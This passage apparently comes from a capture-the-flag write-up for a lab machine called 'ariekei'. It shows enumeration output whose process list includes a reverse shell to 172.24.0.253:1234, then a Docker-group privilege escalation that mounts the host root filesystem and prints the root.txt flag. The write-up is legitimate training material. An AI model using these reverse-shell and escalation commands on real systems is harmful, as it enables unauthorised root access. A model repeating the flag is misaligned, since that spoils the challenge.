root      2953  0.0  0.2 272864  5084 ?        Sl   19:40   0:00 docker-containerd-shim d77fe9521405cf7a169d2755e80b350aa5c606704eb1121ed9c5d004055b1056 /var/run/docker/libcontainerd/d77fe9521405cf7a169d2755e80b350aa5c606704eb1121ed9c5d004055b1056 docker-runc
root      2989  0.0  0.0   4188   540 pts/0    Ss   19:40   0:00 /bin/sh /usr/sbin/apache2ctl -DFOREGROUND
root      3037  0.0  0.2  71808  4928 pts/0    S    19:40   0:00 /usr/sbin/apache2 -DFOREGROUND
www-data  3038  0.0  0.1  71540  3724 pts/0    S    19:40   0:00 /usr/sbin/apache2 -DFOREGROUND
www-data  3039  0.0  0.2 295364  4508 pts/0    Sl   19:40   0:00 /usr/sbin/apache2 -DFOREGROUND
www-data  3040  0.0  0.2 295364  4508 pts/0    Sl   19:40   0:00 /usr/sbin/apache2 -DFOREGROUND
root      3095  0.0  0.2  66028  5484 ?        Ss   19:40   0:00 sshd: root@pts/2
root      3097  0.0  0.1  18200  3372 ?        Ss   19:40   0:00 -bash
root      3138  0.0  0.0   9144   792 ?        S+   19:41   0:00 nc -nlvp 1234
www-data  3140  0.0  0.1  17652  2632 pts/0    S    19:41   0:00 /bin/bash -c bash -i >& /dev/tcp/172.24.0.253/1234 0>&1;
www-data  3141  0.0  0.1  17832  3032 pts/0    S    19:41   0:00 bash -i
www-data  3302  0.0  0.3  32688  6448 pts/0    S+   19:46   0:00 python -c import pty; pty.spawn("/bin/bash")
www-data  3303  0.0  0.1  17832  3060 ?        Ss   19:46   0:00 /bin/bash
root      3393  0.0  0.1  35660  2300 ?        S    19:49   0:00 su -
root      3394  0.0  0.1  17840  3084 ?        S+   19:49   0:00 -su
root      3615  0.0  0.3  95372  6956 ?        Ss   19:55   0:00 sshd: spanishdancer [priv]
spanish+  3617  0.0  0.2  45236  4824 ?        Ss   19:55   0:00 /lib/systemd/systemd --user
root      3619  0.0  0.0      0     0 ?        S    19:55   0:00 [kworker/0:1]
spanish+  3621  0.0  0.1  61368  2100 ?        S    19:55   0:00 (sd-pam)
spanish+  3735  0.0  0.1  95372  3312 ?        S    19:55   0:00 sshd: spanishdancer@pts/0
spanish+  3741  0.0  0.2  22572  5168 pts/0    Ss   19:55   0:00 -bash
spanish+  4108  0.0  0.2  13492  4108 pts/0    S+   20:06   0:00 bash
spanish+  4109  0.0  0.1  13636  3596 pts/0    S+   20:06   0:00 bash
spanish+  4110  0.0  0.0   7300   656 pts/0    S+   20:06   0:00 tee -a
root      4184  0.0  0.0      0     0 ?        S    20:06   0:00 [kworker/0:0]
spanish+  4382  0.0  0.1  13604  2892 pts/0    S+   20:09   0:00 bash
spanish+  4383  0.0  0.1  37364  3412 pts/0    R+   20:09   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1016K -rwxr-xr-x 1 root root 1014K Jun  5 19:34 /bin/bash
    0 lrwxrwxrwx 1 root root     4 Jun  5 19:34 /bin/sh -> dash
 1.6M -rwxr-xr-x 1 root root  1.6M Jun  5 19:55 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Jul 18  2017 /lib/systemd/systemd-journald
 608K -rwxr-xr-x 1 root root  605K Jun  5 19:34 /lib/systemd/systemd-logind
 140K -rwxr-xr-x 1 root root  139K Jul 18  2017 /lib/systemd/systemd-timesyncd
 444K -rwxr-xr-x 1 root root  443K Sep 21  2017 /lib/systemd/systemd-udevd
  44K -rwxr-xr-x 1 root root   44K Jun  5 19:34 /sbin/agetty
    0 lrwxrwxrwx 1 root root    20 Sep 16  2017 /sbin/init -> /lib/systemd/systemd
 768K -rwxr-xr-x 1 root root  766K Jun  5 19:34 /sbin/iscsid
  52K -rwxr-xr-x 1 root root   51K Sep 16  2017 /sbin/lvmetad
 504K -rwxr-xr-x 1 root root  502K Jun  5 19:34 /sbin/mdadm
 220K -rwxr-xr-x 1 root root  219K Jun  5 19:34 /usr/bin/dbus-daemon
  38M -rwxr-xr-x 1 root root   38M Jun  5 19:34 /usr/bin/dockerd
 2.4M -rwxr-xr-x 1 root root  2.4M Jun  5 19:34 /usr/bin/docker-proxy
  20K -rwxr-xr-x 1 root root   19K Jun  5 19:34 /usr/bin/lxcfs
  44K -rwxr-xr-x 1 root root   44K Jun  5 19:34 /usr/bin/vmtoolsd
 164K -rwxr-xr-x 1 root root  162K Jun  5 19:34 /usr/lib/accountsservice/accounts-daemon
  16K -rwxr-xr-x 1 root root   15K Jun  5 19:34 /usr/lib/policykit-1/polkitd
  20M -rwxr-xr-x 1 root root   20M Jun  5 19:34 /usr/lib/snapd/snapd
  48K -rwxr-xr-x 1 root root   47K Jun  5 19:34 /usr/sbin/acpid
  28K -rwxr-xr-x 1 root root   27K Jun  5 19:34 /usr/sbin/atd
  44K -rwxr-xr-x 1 root root   44K Jun  5 19:34 /usr/sbin/cron
 588K -rwxr-xr-x 1 root root  586K Jun  5 19:34 /usr/sbin/rsyslogd
 784K -rwxr-xr-x 1 root root  781K Jun  5 19:34 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 316
drwxr-xr-x  2 root root 4096 Sep 23  2017 .
drwxr-xr-x 91 root root 4096 Sep 23  2017 ..
-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 1904 Oct 15  2014 cgroupfs-mount
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rw-r--r--  1 root root 1322 Sep 23  2017 .depend.boot
-rw-r--r--  1 root root 1120 Sep 23  2017 .depend.start
-rw-r--r--  1 root root 1236 Sep 23  2017 .depend.stop
-rwxr-xr-x  1 root root 3843 Sep  5  2017 docker
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2300 Jul  5  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Jun  8  2017 lxd
-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 1364 Jan  2  2016 netfilter-persistent
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Jun 14  2017 uuidd


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1588 Sep 16  2017 /etc/passwd
-rw-r--r-- 1 root root 789 Sep 23  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1048 Sep 23  2017 /etc/shadow


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 3028 Aug  1  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 7788 Sep 16  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 350 Sep 16  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 100 Jan 10  2017 /etc/sos.conf
-rw-r--r-- 1 root root 6816 May 11  2017 /etc/overlayroot.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 144 Sep 16  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 2084 Sep  6  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 13 root root 4096 Sep 16  2017 ..


[+] Looks like we're hosting Docker:
Docker version 17.06.2-ce, build cec0b72
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                          NAMES
c362989563fd        convert-template    "/bin/sh -c 'pytho..."   6 months ago        Up 35 minutes       8080/tcp                       convert-live
7786500c3e80        bastion-template    "/usr/sbin/sshd -D"      6 months ago        Up 35 minutes       0.0.0.0:1022->22/tcp           bastion-live
e980d631b20e        waf-template        "/bin/sh -c 'nginx..."   6 months ago        Up 35 minutes       80/tcp, 0.0.0.0:443->443/tcp   waf-live
d77fe9521405        web-template        "/usr/sbin/apache2..."   6 months ago        Up 30 minutes       80/tcp                         blog-test
f09d48cdcc74        bastion-template    "/bin/bash"              7 months ago        Up 35 minutes       22/tcp                         youthful_elion
eaf0202889f6        web-template        "/bin/bash"              7 months ago        Up 35 minutes       80/tcp                         gifted_elion


[+] We're a member of the (docker) group - could possibly misuse these rights!
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)


[-] Anything juicy in the Dockerfile:
-rw-r--r-- 1 root docker 144 Sep 23  2017 /opt/docker/containers/blog-test/Dockerfile
-rwxr-xr-x 1 root root 408 Sep 20  2017 /opt/docker/containers/waf-live/Dockerfile
-rw-r--r-- 1 root root 38 Sep 23  2017 /opt/docker/containers/convert-live/Dockerfile
-rw-r--r-- 1 root docker 546 Sep 21  2017 /opt/docker/containers/bastion-live/Dockerfile
-rw-r--r-- 1 root root 1242 Sep  5  2017 /usr/share/docker-ce/contrib/desktop-integration/chromium/Dockerfile
-rw-r--r-- 1 root root 935 Sep  5  2017 /usr/share/docker-ce/contrib/desktop-integration/gparted/Dockerfile


### SCAN COMPLETE ####################################
spanishdancer@ariekei:~$
```

[`Privilege escalation via Docker`](https://fosterelli.co/privilege-escalation-via-docker.html)

```sh

spanishdancer@ariekei:~$ docker run -it -v /:/opt bash bash
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# cd /root
bash-4.4# ls -lah
total 8
drwx------    2 root     root        4.0K Jun 25  2017 .
drwxr-xr-x   33 root     root        4.0K Jun  6 00:12 ..
bash-4.4# cd /opt/
bash-4.4# ls -lah
total 93
drwxr-xr-x   23 root     root        4.0K Sep 16  2017 .
drwxr-xr-x   33 root     root        4.0K Jun  6 00:12 ..
drwxr-xr-x    2 root     root        4.0K Sep 21  2017 bin
drwxr-xr-x    4 root     root        1.0K Sep 21  2017 boot
drwxr-xr-x   20 root     root        3.9K Jun  5 23:34 dev
drwxr-xr-x   91 root     root        4.0K Sep 24  2017 etc
drwxr-xr-x    3 root     root        4.0K Sep 16  2017 home
lrwxrwxrwx    1 root     root          32 Sep 16  2017 initrd.img -> boot/initrd.img-4.4.0-87-generic
drwxr-xr-x   22 root     root        4.0K Sep 16  2017 lib
drwxr-xr-x    2 root     root        4.0K Sep 16  2017 lib64
drwx------    2 root     root       16.0K Sep 16  2017 lost+found
drwxr-xr-x    3 root     root        4.0K Sep 16  2017 media
drwxr-xr-x    2 root     root        4.0K Aug  1  2017 mnt
drwxr-xr-x    4 root     root        4.0K Sep 23  2017 opt
dr-xr-xr-x  207 root     root           0 Jun  5 23:34 proc
drwx------    3 root     root        4.0K Feb 11 17:58 root
drwxr-xr-x   25 root     root         940 Jun  5 23:55 run
drwxr-xr-x    2 root     root       12.0K Sep 21  2017 sbin
drwxr-xr-x    2 root     root        4.0K Apr 29  2017 snap
drwxr-xr-x    2 root     root        4.0K Aug  1  2017 srv
dr-xr-xr-x   13 root     root           0 Jun  5 23:34 sys
drwxrwxrwt    9 root     root        4.0K Jun  6 00:14 tmp
drwxr-xr-x   10 root     root        4.0K Sep 16  2017 usr
drwxr-xr-x   13 root     root        4.0K Sep 16  2017 var
lrwxrwxrwx    1 root     root          29 Sep 16  2017 vmlinuz -> boot/vmlinuz-4.4.0-87-generic
bash-4.4#
bash-4.4# cd root/
bash-4.4# ls -lah
total 40
drwx------    3 root     root        4.0K Feb 11 17:58 .
drwxr-xr-x   23 root     root        4.0K Sep 16  2017 ..
-rw-r--r--    1 root     root        3.1K Sep 24  2017 .bashrc
drwx------    2 root     root        4.0K Feb 11 17:39 .cache
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
-rw-------    1 root     root        1.0K Sep 24  2017 .rnd
-rw-r--r--    1 root     root          75 Sep 23  2017 .selected_editor
-rw-------    1 root     root        7.6K Feb 11 17:58 .viminfo
-r--------    1 root     root          33 Sep 24  2017 root.txt
bash-4.4# cat root.txt
0385b6629b30f8a673f7bb279fb1570b
bash-4.4#
```